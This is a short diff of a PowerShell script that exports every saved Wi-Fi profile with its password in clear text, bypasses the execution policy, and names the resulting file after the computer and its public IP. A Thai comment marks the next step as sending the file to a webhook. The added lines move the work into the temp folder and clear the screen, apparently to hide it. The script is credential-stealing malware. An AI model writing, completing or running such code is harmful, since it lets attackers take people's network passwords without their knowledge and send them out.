@@ -1,3 +1,4 @@
+cd $env:TEMP
 netsh wlan export profile key=clear
 Set-ExecutionPolicy Bypass -Scope Process -Force
 
@@ -17,6 +18,8 @@ $publicIp = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=text')
 $random = Get-Random -Minimum 100 -Maximum 1000
 $newFileName = "Wi-Fi-PASS_(PC-$computerName)-(IP-$publicIp)_$random.txt"
 Rename-Item -Path "$env:TEMP\Wi-Fi-PASS.txt" -NewName $newFileName
+
+cls
 
 # ส่งไฟล์ไปยัง Webhook
 
